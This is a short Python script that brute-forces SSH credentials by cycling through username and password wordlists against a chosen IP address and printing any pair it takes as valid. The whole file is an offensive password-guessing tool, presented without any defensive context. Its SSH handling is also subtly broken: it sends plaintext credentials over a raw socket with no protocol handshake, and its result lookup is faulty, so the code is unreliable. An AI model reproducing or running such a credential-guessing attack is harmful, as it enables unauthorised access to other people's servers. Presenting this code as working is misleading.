import socket

def ssh_login(username, password, hostname, cache):
    if (username, password) in cache:
        return False

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((hostname, 22))

        # Receive initial SSH banner
        response = sock.recv(1024).decode()
        
        # Send SSH username
        sock.sendall(f"{username}\n".encode())
        
        # Receive response
        response = sock.recv(1024).decode()
        
        if "password" in response.lower():
            # Send SSH password
            sock.sendall(f"{password}\n".encode())
            
            # Receive response
            response = sock.recv(1024).decode()
            
            if "permission denied" not in response.lower():
                print(f"Valid username found: {username} Valid password found: {password}")
                cache.add((username, password))
                return (username, password)
            else:
                print(f"Permission denied for username: {username}")

    except (socket.timeout, ConnectionRefusedError) as e:
        print(f"Error occurred: {str(e)}")
        return False

    finally:
        sock.close()

    return False

def main():
    hostname = input("Enter the IP address of the SSH server: ")
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    cache = set()
    results = []
    for username in usernames:
        for password in passwords:
            result = ssh_login(username, password, hostname, cache)
            results.append(result)
            if result:
                break

    if any(results):
        print(f"Successful login: {results[results.index(True)][0]}:{results[results.index(True)][1]}")
    else:
        print("Login unsuccessful.")

if __name__ == "__main__":
    main()
